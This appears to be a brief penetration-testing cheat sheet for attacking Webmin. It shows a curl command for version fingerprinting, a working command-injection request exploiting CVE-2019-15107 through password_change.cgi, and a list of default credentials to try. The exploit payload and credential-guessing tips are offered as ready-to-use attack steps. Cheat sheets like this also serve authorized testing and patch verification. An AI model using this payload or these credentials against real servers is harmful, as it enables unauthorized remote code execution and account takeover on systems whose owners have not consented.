# Webmin

### Identify Webmin version

Usually on port 10000 — Check login page source

```bash
curl -sk https://$IP:10000/ | grep -i version
```

---

### Webmin RCE (CVE-2019-15107)

Unauthenticated RCE on Webmin 1.890-1.920 — Password reset backdoor

```bash
curl -sk "https://$IP:10000/password_change.cgi" -d 'user=root&pam=&expired=2&old=id%7Cid&new1=test&new2=test'
```

---

### Default credentials

Common Webmin logins — Check for password reuse with system accounts

```bash
# root:<system password>
# admin:admin
# Webmin uses PAM by default = system credentials work
```

---
